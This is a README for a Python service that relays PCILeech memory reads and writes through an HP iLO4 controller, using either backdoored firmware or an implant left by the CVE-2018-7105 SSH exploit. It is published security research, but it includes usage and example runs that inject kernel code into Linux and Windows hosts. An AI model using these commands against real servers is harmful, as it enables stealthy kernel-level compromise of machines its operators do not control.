PCILeech HP iLO4 Service
========================

This is a Python service relaying read and write queries from PCILeech to an HP iLO4 device flashed with a modified firmware.

Usage
-----

	$ python run.py -h
	usage: run.py [-h] [-m MODULE] [-u USER] [-p PASSWORD] [-P PORT] [-v]
	              remote_addr

	HP iLO4 PCILeech service

	positional arguments:
	  remote_addr           IP address of the target iLO4 interface

	optional arguments:
	  -h, --help            show this help message and exit
	  -m MODULE, --module MODULE
	                        Module to use (backdoor, ssh_exploit)
	  -u USER, --user USER  user name
	  -p PASSWORD, --password PASSWORD
	                        SSH password
	  -P PORT, --port PORT  SSH port
	  -v, --verbose         verbosity

Modules
-------

#### backdoor

This modules uses the modified firmware developped as a demonstration for the [`SSTIC` presentation](https://www.sstic.org/2018/presentation/backdooring_your_server_through_its_bmc_the_hpe_ilo4_case/).

Tools to build and flash this firmware are available on the [ilo4_toolbox repository](https://github.com/airbus-seclab/ilo4_toolbox).

	/pcileech_hpilo4_service$ python run.py -m backdoor 192.168.42.78

	---

	$ time ./pcileech kmdload -vvv -device rawtcp -device-addr 127.0.0.1 -device-port 8888 -kmd LINUX_X64_48 

	 Current Action: Scanning for Linux kernel base
	 Access Mode:    DMA (hardware only)
	 Progress:       748 / 268435422 (0%)
	 Speed:          6 MB/s
	 Address:        0x000000002FA00000
	 Pages read:     191488 / 68719468032 (0%)
	 Pages failed:   0 (0%)

	 Current Action: Verifying Linux kernel base
	 Access Mode:    DMA (hardware only)
	 Progress:       32 / 32 (100%)
	 Speed:          1 MB/s
	 Address:        0x0000000031A00000
	 Pages read:     8192 / 8192 (100%)
	 Pages failed:   0 (0%)
	KMD: Code inserted into the kernel - Waiting to receive execution.
	KMD: Execution received - continuing ...
	KMD: Successfully loaded at address: 0x76680000

	real    2m38.038s

#### ssh_exploit

This modules uses the in-memory implant installed by the SSH service exploit (CVE-2018-7105) written by [IooNag](https://www.twitter.com/IooNag).

The exploit is available on the [ilo4_toolbox repository](https://github.com/airbus-seclab/ilo4_toolbox) and should be run before using this service.

Dumping large amounts of memory using this modules is not recommended. Therefore, don't use it for a Linux system since dumping 16MB of kernel memory is required.

	/pcileech_hpilo4_service$ python run.py -v -m ssh_exploit -u admin -p password 192.168.42.78

	---

	$ time ./pcileech kmdload -vvv -device rawtcp -device-addr 127.0.0.1 -device-port 8888 -kmd WIN10_X64

	KMD: Code inserted into the kernel - Waiting to receive execution.
	KMD: Execution received - continuing ...
	KMD: Successfully loaded at address: 0x7fffe000

	real	1m0.826s
	user	0m0.000s
	sys	0m0.010s

